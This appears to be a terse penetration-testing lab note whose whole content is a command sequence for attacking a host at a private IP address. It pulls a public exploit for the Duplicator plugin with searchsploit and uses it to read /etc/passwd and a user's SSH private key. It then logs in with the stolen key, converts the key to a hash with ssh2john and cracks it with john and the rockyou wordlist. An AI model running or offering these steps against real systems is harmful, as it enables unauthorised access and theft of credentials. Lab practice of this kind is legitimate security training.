---
tags:duplicator,ssh,key,ssh2john,hash,crack
---
#searchsploit -x 50420

searchsploit -m 50420

python3 50420.py http://192.168.50.244 /etc/passwd
python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
ssh -i id_rsa daniela@192.168.50.244
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

